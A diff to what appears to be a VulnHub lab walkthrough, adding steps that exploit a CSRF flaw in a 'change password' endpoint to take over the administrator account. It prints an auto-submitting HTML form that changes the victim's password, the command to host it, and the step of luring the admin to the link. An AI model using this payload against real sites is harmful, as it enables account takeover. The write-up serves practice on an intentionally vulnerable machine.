@@ -72,16 +72,41 @@ if we check the `change password` we clearly see that is it vulnerable to CSRF a
 - it uses cookie for sessions
 - it has no protection like CSRF token
 
+keep it in mind we explore the `Messages` and `send message` functionality which we can send message to other users
 
+and other users are listed in `users` menu :
 
+![users](https://github.com/Git-K3rnel/VulnHub/assets/127470407/94484819-71ec-4ec1-82de-8f7342272aa3)
 
+we see that user `spiderman` is administrator so we should some how try to reach his account.
 
+since we have CSRF vulnerability and can send message to spiderman we create a CSRF POC and send a link to spiderman (remember that admin will run service locally)
 
+```html
+<html>
+  <body>
+    <form action="http://127.0.0.1:8081/change-password" method="POST">
+      <input type="hidden" name="password" value="123" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
 
+put the aboove code in `visit.html` file and host it with python webserver :
 
+```bash
+root@kali: python -m http.server 80
+```
 
+send the link in message to spiderman : 
 
+![sendmessage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/3155e9d5-b513-4e9c-9eaa-520166e05c8f)
 
+after sending message and waiting afew seconds we expect that spiderman passwrod would change to `123`
 
 
 
